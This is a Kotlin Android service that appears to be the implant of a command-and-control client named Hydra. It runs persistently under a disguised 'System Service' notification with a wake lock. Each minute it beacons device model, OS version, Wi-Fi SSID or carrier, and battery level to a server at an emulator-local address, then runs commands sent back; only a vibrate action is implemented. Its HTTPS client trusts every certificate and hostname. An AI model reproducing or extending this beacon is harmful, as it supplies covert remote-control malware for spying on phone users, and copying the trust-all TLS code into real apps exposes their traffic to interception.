package com.hydra.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.*
import android.telephony.TelephonyManager
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.*

class HydraService : Service() {
    private val TAG = "Hydra"
    private val client = unsafeOkHttpClient()
    private val handler = Handler(Looper.getMainLooper())
    private val heartbeatInterval = 60000L
    private var wakeLock: PowerManager.WakeLock? = null

    private val checkInRunnable = object : Runnable {
        override fun run() {
            performCheckIn()
            handler.postDelayed(this, heartbeatInterval)
        }
    }

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hydra::C2WakeLock")
        wakeLock?.acquire(10 * 60 * 1000L)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Ghost Service Started - Heartbeat active")
        startMyForegroundService()
        handler.removeCallbacks(checkInRunnable)
        handler.post(checkInRunnable)
        return START_STICKY
    }

    private fun startMyForegroundService() {
        val channelId = "hydra_c2_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Hydra System Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = Notification.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Hydra connectivity active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()

        startForeground(1, notification)
    }

    // --- Added: Telemetry Methods ---
    private fun getNetworkName(): String {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return "Disconnected"
            val capabilities = cm.getNetworkCapabilities(network) ?: return "Disconnected"

            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                val info = wifiManager.connectionInfo
                val ssid = info.ssid.replace("\"", "")
                if (ssid == "<unknown ssid>") "WiFi (No Permission)" else ssid
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                telephonyManager.networkOperatorName ?: "Cellular"
            } else {
                "Unknown Transport"
            }
        } catch (e: Exception) {
            "Network Error"
        }
    }

    private fun getBatteryLevel(): String {
        val batteryStatus: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) "${(level * 100 / scale.toFloat()).toInt()}%" else "Unknown"
    }

    private fun performCheckIn() {
        val url = "https://10.0.2.2:8443/checkin/ANDROID-HEAD-01?platform=android"
        
        // Build the Telemetry JSON
        val telemetry = JSONObject()
        telemetry.put("hostname", "${Build.MANUFACTURER} ${Build.MODEL}")
        telemetry.put("os_version", "Android ${Build.VERSION.RELEASE}")
        telemetry.put("network", getNetworkName())
        telemetry.put("battery", getBatteryLevel())

        val body = telemetry.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Heartbeat failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val responseData = response.body?.string()
                if (response.isSuccessful && responseData != null) {
                    Log.i(TAG, "Check-in Successful")
                    parseCommand(responseData)
                }
                response.close()
            }
        })
    }

    private fun parseCommand(jsonData: String) {
        try {
            val json = JSONObject(jsonData)
            if (json.has("command") && !json.isNull("command")) {
                val cmd = json.getJSONObject("command")
                val action = cmd.getString("action")
                Log.i(TAG, "[!] Received Command: $action")

                if (action == "vibrate") {
                    // Using optLong from your original code
                    val duration = cmd.optLong("duration", 1000L) 
                    val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                    
                    Log.i(TAG, ">> [ACTION] Executing Command: Vibrate ($duration ms)")

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        vibrator.vibrate(duration)
                    }
                }
            } else {
                Log.d(TAG, "No pending command in this heartbeat.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing command: ${e.message}")
        }
    }

    override fun onDestroy() {
        handler.removeCallbacks(checkInRunnable)
        if (wakeLock?.isHeld == true) wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun unsafeOkHttpClient(): OkHttpClient {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val sslContext = SSLContext.getInstance("SSL").apply {
            init(null, trustAllCerts, SecureRandom())
        }
        return OkHttpClient.Builder()
            .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
            .hostnameVerifier { _, _ -> true }
            .build()
    }
}